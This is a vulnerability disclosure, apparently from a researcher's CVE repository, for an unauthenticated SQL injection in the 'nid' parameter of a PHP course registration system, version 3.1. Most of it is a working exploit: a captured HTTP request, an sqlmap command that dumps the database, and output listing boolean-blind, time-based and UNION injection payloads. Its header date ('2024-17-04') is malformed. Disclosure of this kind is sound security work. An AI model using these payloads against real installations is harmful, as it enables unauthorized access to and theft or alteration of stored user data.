# Online Course Registration System - SQL Injection - 2 (Unauthenticated)
+ **Exploit Title:** Online Course Registration System - SQL Injection - 2 (Unauthenticated)
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/online-course-registration-free-download/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7515
+ **Version:** 3.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Course Registration System allows SQL Injection via the 'nid' parameter at "http://localhost/onlinecourse/news-details.php?nid=2". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/onlinecourse"
+ Click on a random news story on the right side
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /onlinecourse/news-details.php?nid=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'nid' parameter to dump the database.
```
sqlmap -r r.txt -p nid --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: nid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: nid=2' AND 9388=9388-- oJCQ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: nid=2' AND (SELECT 5924 FROM (SELECT(SLEEP(5)))nACO)-- Bqrm

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: nid=2' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707871,0x66647a6f4b53586d4f51464f6c75517a7a4a424d4972436e5343694b4f4c474e646b674c476a4f76,0x7170787871),NULL-- -
---
[19:43:33] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:43:33] [INFO] fetching current database
current database: 'onlinecourse'
```
+ current database: `onlinecourse`

![Ekran görüntüsü 2024-05-16 132512](https://github.com/BurakSevben/CVEs/assets/117217689/e927a5e5-a672-4ff7-898d-ab441d928d35)
